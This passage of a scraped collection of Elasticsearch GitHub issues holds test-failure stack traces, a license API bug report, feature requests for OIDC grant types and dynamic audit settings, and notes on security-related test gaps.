  |   | at org.junit.Assert.fail(Assert.java:88) |  
  |   | at org.elasticsearch.test.InternalTestCluster.assertAfterTest(InternalTestCluster.java:2331) |  
  |   | at org.elasticsearch.test.ESIntegTestCase.afterInternal(ESIntegTestCase.java:553) |  
  |   | at org.elasticsearch.test.ESIntegTestCase.cleanUpCluster(ESIntegTestCase.java:2079) |  
  |   | at jdk.internal.reflect.GeneratedMethodAccessor18.invoke(Unknown Source) |  
  |   | at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) |  
  |   | at java.lang.reflect.Method.invoke(Method.java:566) |  
  |   | at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758) |  
  |   | at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:1004) |  
  |   | at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48) |  
  |   | at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36) |  
  |   | at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49) |  
  |   | at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45) |  
  |   | at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48) |  
  |   | at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64) |  
  |   | at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47) |  
  |   | at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36) |  
  |   | at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375) |  
  |   | at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824) |  
  |   | at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475) |  
  |   | at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955) |  
  |   | at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840) |  
  |   | at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891) |  
  |   | at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902) |  
  |   | at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48) |  
  |   | at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45) |  
  |   | at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36) |  
  |   | at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41) |  
  |   | at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40) |  
  |   | at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40) |  
  |   | at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36) |  
  |   | at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36) |  
  |   | at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53) |  
  |   | at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47) |  
  |   | at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64) |  
  |   | at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54) |  
  |   | at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36) |  
  |   | at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375) |  
  |   | at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831) |  
  |   | at java.lang.Thread.run(Thread.java:834)
```

Logs show

```
[2021-09-09T14:15:57,651][WARN ][o.e.t.TcpTransport       ] [node_s3] exception caught on transport layer [TcpNioSocketChannel{localAddress=null, remoteAddress=null, profile=default}], closing connection
javax.net.ssl.SSLException: Closed engine without completely sending the close alert message.
	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.close(SSLDriver.java:161) ~[main/:?]
	at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:74) ~[elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:116) ~[elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:66) ~[elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.closeFromSelector(SSLChannelContext.java:207) ~[main/:?]
	at org.elasticsearch.nio.EventHandler.handleClose(EventHandler.java:229) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.closeChannel(NioSelector.java:469) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.queueChannelClose(NioSelector.java:300) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.closeChannel(SSLChannelContext.java:190) [main/:?]
	at org.elasticsearch.transport.nio.NioTcpChannel.close(NioTcpChannel.java:61) [transport-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:74) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:116) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:99) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.common.network.CloseableChannel.closeChannels(CloseableChannel.java:78) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.transport.TcpTransport$ChannelsConnectedListener.closeAndFail(TcpTransport.java:987) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.transport.TcpTransport$ChannelsConnectedListener.onFailure(TcpTransport.java:975) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.action.ActionListener.lambda$toBiConsumer$0(ActionListener.java:277) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.core.CompletableContext.lambda$addListener$0(CompletableContext.java:31) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at java.util.concurrent.CompletableFuture.uniWhenComplete(CompletableFuture.java:859) [?:?]
	at java.util.concurrent.CompletableFuture$UniWhenComplete.tryFire(CompletableFuture.java:837) [?:?]
	at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:506) [?:?]
	at java.util.concurrent.CompletableFuture.completeExceptionally(CompletableFuture.java:2088) [?:?]
	at org.elasticsearch.core.CompletableContext.completeExceptionally(CompletableContext.java:46) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.SocketChannelContext.connect(SocketChannelContext.java:131) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.EventHandler.handleConnect(EventHandler.java:106) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.attemptConnect(NioSelector.java:417) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.registerChannel(NioSelector.java:440) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.setUpNewChannels(NioSelector.java:429) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.preSelect(NioSelector.java:250) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.singleLoop(NioSelector.java:144) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at org.elasticsearch.nio.NioSelector.runLoop(NioSelector.java:120) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
	at java.lang.Thread.run(Thread.java:834) [?:?]
	Suppressed: javax.net.ssl.SSLException: Closed engine without receiving the close alert message.
		at org.elasticsearch.xpack.security.transport.nio.SSLDriver.close(SSLDriver.java:166) ~[main/:?]
		at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:74) ~[elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:116) ~[elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:66) ~[elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.closeFromSelector(SSLChannelContext.java:207) ~[main/:?]
		at org.elasticsearch.nio.EventHandler.handleClose(EventHandler.java:229) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.closeChannel(NioSelector.java:469) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.queueChannelClose(NioSelector.java:300) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.closeChannel(SSLChannelContext.java:190) [main/:?]
		at org.elasticsearch.transport.nio.NioTcpChannel.close(NioTcpChannel.java:61) [transport-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:74) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:116) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:99) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.common.network.CloseableChannel.closeChannels(CloseableChannel.java:78) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.transport.TcpTransport$ChannelsConnectedListener.closeAndFail(TcpTransport.java:987) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.transport.TcpTransport$ChannelsConnectedListener.onFailure(TcpTransport.java:975) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.action.ActionListener.lambda$toBiConsumer$0(ActionListener.java:277) [elasticsearch-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.core.CompletableContext.lambda$addListener$0(CompletableContext.java:31) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at java.util.concurrent.CompletableFuture.uniWhenComplete(CompletableFuture.java:859) [?:?]
		at java.util.concurrent.CompletableFuture$UniWhenComplete.tryFire(CompletableFuture.java:837) [?:?]
		at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:506) [?:?]
		at java.util.concurrent.CompletableFuture.completeExceptionally(CompletableFuture.java:2088) [?:?]
		at org.elasticsearch.core.CompletableContext.completeExceptionally(CompletableContext.java:46) [elasticsearch-core-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.SocketChannelContext.connect(SocketChannelContext.java:131) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.EventHandler.handleConnect(EventHandler.java:106) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.attemptConnect(NioSelector.java:417) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.registerChannel(NioSelector.java:440) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.setUpNewChannels(NioSelector.java:429) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.preSelect(NioSelector.java:250) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.singleLoop(NioSelector.java:144) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at org.elasticsearch.nio.NioSelector.runLoop(NioSelector.java:120) [elasticsearch-nio-8.0.0-SNAPSHOT.jar:8.0.0-SNAPSHOT]
		at java.lang.Thread.run(Thread.java:834) [?:?]
```
","Pinging @elastic/es-security (Team:Security)Had another instance of this failure: https://gradle-enterprise.elastic.co/s/w6qy6wijryvqs

Muted the test with https://github.com/elastic/elasticsearch/pull/77518I encountered a failure of this test on 7.15 too, albeit with different symptoms: https://gradle-enterprise.elastic.co/s/zrooj4ggt6bza

```
com.carrotsearch.randomizedtesting.UncaughtExceptionError: Captured an uncaught exception in thread: Thread[id=3210, name=Thread-33, state=RUNNABLE, group=TGRP-SSLReloadDuringStartupIntegTests]
Caused by: java.io.UncheckedIOException: java.nio.file.AccessDeniedException: C:\Users\jenkins\workspace\platform-support\56\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests_DDBA3F0E8B6C43A4-001\tempFile-004.tmp -> C:\Users\jenkins\workspace\platform-support\56\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests_DDBA3F0E8B6C43A4-001\tempDir-003\SUITE-1\config\testnode.jks
	at __randomizedtesting.SeedInfo.seed([DDBA3F0E8B6C43A4]:0)
	at org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests$1.lambda$onNodeStopped$0(SSLReloadDuringStartupIntegTests.java:101)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.nio.file.AccessDeniedException: C:\Users\jenkins\workspace\platform-support\56\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests_DDBA3F0E8B6C43A4-001\tempFile-004.tmp -> C:\Users\jenkins\workspace\platform-support\56\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests_DDBA3F0E8B6C43A4-001\tempDir-003\SUITE-1\config\testnode.jks
	at sun.nio.fs.WindowsException.translateToIOException(WindowsException.java:83)
	at sun.nio.fs.WindowsException.rethrowAsIOException(WindowsException.java:97)
	at sun.nio.fs.WindowsFileCopy.move(WindowsFileCopy.java:301)
	at sun.nio.fs.WindowsFileSystemProvider.move(WindowsFileSystemProvider.java:287)
	at org.apache.lucene.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:147)
	at org.apache.lucene.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:147)
	at org.apache.lucene.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:147)
	at org.apache.lucene.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:147)
	at java.nio.file.Files.move(Files.java:1395)
	at org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests.copyAndAtomicMoveIfPossible(SSLReloadDuringStartupIntegTests.java:123)
	at org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests.access$000(SSLReloadDuringStartupIntegTests.java:31)
	at org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests$1.lambda$onNodeStopped$0(SSLReloadDuringStartupIntegTests.java:98)
	... 1 more
```

and

```
	at org.elasticsearch.test.InternalTestCluster.validateClusterFormed(InternalTestCluster.java:1320)
	at org.elasticsearch.test.InternalTestCluster.restartNode(InternalTestCluster.java:1950)
	at org.elasticsearch.test.InternalTestCluster.restartNode(InternalTestCluster.java:1905)
	at org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests.testReloadDuringStartup(SSLReloadDuringStartupIntegTests.java:78)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
	at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
	at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
	at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
	at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
	at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
	at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
	at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
	at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.lang.AssertionError: Missing master, expected nodes: [{node_s0}{AzdMRfl7TFGZqeM3gx99rA}{CFhOIFAqQpGL5ncrceEcrQ}{127.0.0.1}{127.0.0.1:55179}{cdfhimrsw}{xpack.installed=true}, {node_s2}{F1ZTMsaSTb2Jba5T0vg8wQ}{Cf2fB8h_T2OufWPerGcKYw}{127.0.0.1}{127.0.0.1:55180}{xpack.installed=true}, {node_s1}{dSz6u7lgQk-oNhjDhra0rg}{Y51gOXx1R-qiLXkFLFR61g}{127.0.0.1}{127.0.0.1:55285}{cdfhimrsw}{xpack.installed=true}] and actual cluster states [cluster uuid: 0Iv-_FldTrG7YYsGm_tdnQ [committed: true]
...
```

I backported the mute to 7.x and 7.15.",no,">test-failure,:Security/TLS,Team:Security,"
elastic/elasticsearch,317447048,"We should have some service disruption tests with security enabled","*Original comment by @bleskes:*

Security integrates deeply into ES and how it works. As we learned (LINK REDACTED) it have unexpected side effects. We should have some basic disruption testing going on while security is enabled. We don't have to go to the same lengths we do in ES proper, but  I think we should have simple tests, like:
- isolating a master and seeing the cluster successfully go through master election
- isolating the primary of security indices and see that primary promotion goes well


","*Original comment by @bleskes:*

PS - the testing infra in ES should make it very simple to do
",no,">test,help wanted,:Security/Security,Team:Security,"
elastic/elasticsearch,317447261,"License API should not report `subscription` as license type","*Original comment by @jaymode:*

The GET License API reports the `type` of a 1.x license as `subscription` and not the actual `subscriptionType`. In the cases of these license we should see the `type` as the `subscriptionType`. Example output from `2.2`:

``` json
{
  ""license"" : {
    ""status"" : ""active"",
    ""uid"" : ""604f95fb-c58e-46b0-b6a2-0c829d96489b"",
    ""type"" : ""subscription"",
    ""issue_date"" : ""2015-05-08T00:00:00.000Z"",
    ""issue_date_in_millis"" : 1431043200000,
    ""expiry_date"" : ""2016-05-07T23:59:59.999Z"",
    ""expiry_date_in_millis"" : 1462665599999,
    ""max_nodes"" : 10,
    ""issued_to"" : ""US Federal"",
    ""issuer"" : ""Rosed Marquez""
  }
}
```


",,no,">bug,v5.0.0-alpha2,:Security/License,Team:Security,"
elastic/elasticsearch,603449277,"Feature request : OpenID Connect : add support for ""Client Credentials"" and ""Ressource Owner Password"" grant type","**Describe the feature**:

Hello
Thanks to @jkakavas, since version 7.2 elasticsearch [does support OpenID (oauth2) as authentication method](https://www.elastic.co/guide/en/elasticsearch/reference/master/oidc-guide-authentication.html). Two OpenID flows are currently implemented : ```Authorization Code``` and ```Implicit```

This is great. It work perfectly...As long as you are an user using Kibana.  These two flows are not designed for scripts performing queries on Elastic.

OpenID also support ```machine to machine``` logins, using other flows (```Client Credentials``` and ```Ressource Owner Password```). 

It would be nice to implement those into Elastic. This way, it would be possible to authenticate service accounts on elastic using an OpenID server, instead of managing those accounts locally.

Would it be possible to integrate this in the future ?","Pinging @elastic/es-security (:Security/Authentication)Also see #54582Hi there @Augustin-FL, thank you for your thoughts

> since version 7.2 elasticsearch does support OpenID (oauth2)

To be precise, we support neither `OpenID`, nor `oauth2`, but _only_ `OpenID Connect`. 

Our OpenID Connect realm aims to be compliant to the [OpenID Connect Core specification](https://openid.net/specs/openid-connect-core-1_0.html). As such, it purposefully does not support neither resource owner password grant nor client credentials grant as defined in [RFC6749](https://tools.ietf.org/html/rfc6749#section-4.3.2). as these are not defined in the OpenId Connect spec. 

Your use case exists and is a valid one, but it would be better suited by a generic oAuth2 realm where elasticsearch plays the role of the `Resource Server`. OpenID Connect is geared towards authenticating humans using a browser and doesn't (aim to) cater well for these kinds of use cases. 

We have discussed the possibility of offering such functionality in the past but there is no current plan to do so. We can keep this issue for tracking though, thanks for raising this. ",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,498804717,"Multindex expressions expands to missing indices with Security","The ES Security Plugin does wildcard expansion in `IndicesAndAliasesResolver` on the coordinating node of the request. During this process, it rewrites the request to not include wildcards but only concrete indices. There are a few known problems with this approach, for example see https://github.com/elastic/elasticsearch/issues/45171#issuecomment-534869186.

This issue is acknowledging another limitation of this approach. The wildcard expansion and the actual handling of the request for the expanded concrete indices could happen on different cluster state versions. For example, a wildcard expression is expanded to an index that is subsequently removed, but before the actual handling of the request takes place. This will generate an index missing exception (assuming `ignore_unavailable=false`). The same result is not possible with Security turned off because wildcard expansion and request handling work on the same cluster state version.

Causes https://github.com/elastic/elasticsearch/issues/45652","Pinging @elastic/es-securityThe code I used to investigate this problem is on commit https://github.com/droberts195/elasticsearch/commit/3fe500d2503b49aa9599ccba7fccff3bd22195b4 of the [`cat_indices_404_repro` branch in my fork](https://github.com/droberts195/elasticsearch/tree/cat_indices_404_repro).

Run `./runner.sh >& runner.log` from the top level of the repo and eventually the problem will occur and you can then edit `x-pack/plugin/ml/qa/native-multi-node-tests/build/testclusters/*/logs/integTest.log` to examine the server logs.

(You probably think I'm crazy to not just run `./gradlew :x-pack:plugin:ml:qa:native-multi-node-tests:integTestRunner --tests org.elasticsearch.xpack.ml.integration.MlJobIT -Dtests.iters=100`.  I _did_ try this, and never managed to reproduce the problem with it.  This leads me to think that once hotspot has optimised the code the problem doesn't occur.  I also tried a `while` loop in the shell script and that didn't reproduce the problem either, hence the many duplicated lines.  I cannot think of a good explanation for why copy and paste was more successful than a `while` loop at the shell script level.  I guess the problem is just _extremely_ intermittent and sensitive to timing.)#81901 contains another way to reproduce this problem.",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317448508,"Add LDAP follow referral Integration test","*Original comment by @albertzaharovits:*

The [ActiveDirectorySessionFactoryTests#testHandlingLdapReferralErrors](https://github.com/elastic/elasticsearch/blob/36a3b84fc968f9aec5c3482dee69a1e53a7ac94a/x-pack/qa/third-party/active-directory/src/test/java/org/elasticsearch/xpack/security/authc/ldap/ActiveDirectorySessionFactoryTests.java#L310) test is relying on a bug, see LINK REDACTED .
In the test, LDAP referral are expected to fail because of invalid credentials. The test passed because the credentials of the original request, which are reused by the referral connections, were erroneously cleared.

The requirement is for a test that checks referral errors are not silently ignored when `ignore_referral_errors` is false.
",,no,">test,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317454442,"Dynamic audit log filter settings via cluster update API","*Original comment by @albertzaharovits:*

It is expected that getting the [audit filtering policies](https://www.elastic.co/guide/en/x-pack/current/auditing.html#audit-log-ignore-policy) suitable for each environment will require manual tunning.
In this case, it would be beneficial to have these settings dynamic, via cluster settings update API.

@joshbressers I have misinformed one of the SAs (I am sorry I don't recall his name) when he asked me about this in the meeting you demoed this functionality. I assumed this magically works....","*Original comment by @joshbressers:*

We can consider this a new feature request then :)*Original comment by @albertzaharovits:*

The request to have an API for audit policies was to facilitate faster iterations over them, so that changing the policies will not require a node restart.

Yet, I am concerned about adding an API for changing the audit log settings. This is a second thought after creating LINK REDACTED, and also covers LINK REDACTED .
The problem is that an attacker can use the API to hide his actions. In LINK REDACTED any user with privileges to change cluster settings can mask his actions from being audited by creating a policy ignoring it's future actions. Instead, if the audit settings (incl policies) are inside the `elasticsearch.yml` file the attacker requires local host privileges, which is sound.

I think we should keep high privileges for changing the audit settings.
I could not think of any clear solution to this. Three of the less phantasmagorical solutions I could come up with are:
1) these settings can only be changed 6h after node startup.
2) the `elasticsearch.yml` file can be monitored for changes, and only keep these settings there.
3) the authorization logic has a wild branch allowing changes only from a localhost remote endpoint.

Ideally there might be other settings requiring this kind of special attention, to have a stronger point when deciding.

/CC @elastic/es-security 

*Original comment by @jaymode:*

> I think we should keep high privileges for changing the audit settings.

I agree but I think if you are allowed to update the cluster settings, then you already have high privileges?

Another option could include the ability to ignore dynamic settings in the audit trail via a setting that has to be in the elasticsearch.yml file.*Original comment by @albertzaharovits:*

What I mean is that the update API effectively limits the capability of auditing `superuser`s . File system permissions are privileges that an ES application user does not have, hence the 'higher privileges' .

> Another option could include the ability to ignore dynamic settings in the audit trail via a setting that has to be in the elasticsearch.yml file.

I like this a lot! I will open a PR 🙂 
*Original comment by @albertzaharovits:*

> Another option could include the ability to ignore dynamic settings in the audit trail via a setting that has to be in the `elasticsearch.yml` file.

We have concluded over Slack that the proposed solutions to ignore dynamic settings are more confusing than useful. Any such solution would effectively reverse the standard priorities (transient > persistent > file) for some settings, for some nodes, if they have been restarted. This would definitely lead to confusion about which settings are actually in effect.

**Audit settings remain dynamic as any other setting.***Original comment by @LucaWintergerst:*

@albertzaharovits can we think about adding an option to disable changing audit settings dynamically?

I really like having them dynamic for testing purposes but once I have something that works for me I would like to lock them down by setting something like this:
